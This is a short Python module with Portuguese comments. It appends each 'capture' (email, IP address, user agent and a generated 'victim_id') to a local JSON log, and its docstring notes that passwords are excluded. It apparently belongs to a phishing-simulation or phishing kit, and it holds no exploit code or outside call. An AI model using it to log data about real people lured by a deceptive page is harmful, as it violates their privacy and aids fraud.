"""Registar metadados em captures.json (sem passwords)."""

import json
import os
import uuid
from datetime import datetime, timezone

LOG_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "logs", "captures.json")


def log_capture(email: str, ip: str, user_agent: str) -> str:
    # Criar entrada e acrescentar ao ficheiro JSON
    log_file = os.path.normpath(LOG_PATH)
    os.makedirs(os.path.dirname(log_file), exist_ok=True)

    victim_id = str(uuid.uuid4())
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "email": email,
        "ip": ip,
        "user_agent": user_agent,
        "victim_id": victim_id,
    }

    records: list = []
    if os.path.isfile(log_file):
        with open(log_file, "r", encoding="utf-8") as fh:
            try:
                records = json.load(fh)
            except (json.JSONDecodeError, ValueError):
                records = []

    records.append(entry)

    with open(log_file, "w", encoding="utf-8") as fh:
        json.dump(records, fh, indent=2, ensure_ascii=False)

    return victim_id
